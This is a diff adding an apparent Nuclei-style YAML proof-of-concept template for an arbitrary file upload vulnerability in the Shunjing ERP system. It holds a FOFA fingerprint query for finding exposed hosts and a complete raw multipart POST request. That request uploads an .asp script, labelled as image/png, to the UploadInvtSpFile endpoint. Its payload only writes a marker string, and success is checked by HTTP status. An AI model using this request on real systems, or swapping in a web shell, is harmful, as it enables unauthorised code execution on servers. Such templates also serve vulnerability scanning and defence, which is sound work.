@@ -1,0 +1,45 @@
+id: poc-cl2ehox7i0g9h6zn
+info:
+  name: 顺景ERP管理系统UploadInvtSpFile任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cl2ehox7i0g9h6zn'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: cl2ehox7i0g9h6zn
+    fofa: body="/api/DBRecord/getDBRecords"
+http:
+- raw:
+  - 'POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
+
+    Accept: */*
+
+    Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Length: 10338
+
+
+    -----------------------------45250802924973458471174811279
+
+    Content-Disposition: form-data; name="filedata"; filename="abc123.asp"
+
+    Content-Type: image/png
+
+
+    <% response.write("drwc2nymcirgr7r2bdgb111")%>
+
+    -----------------------------45250802924973458471174811279'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
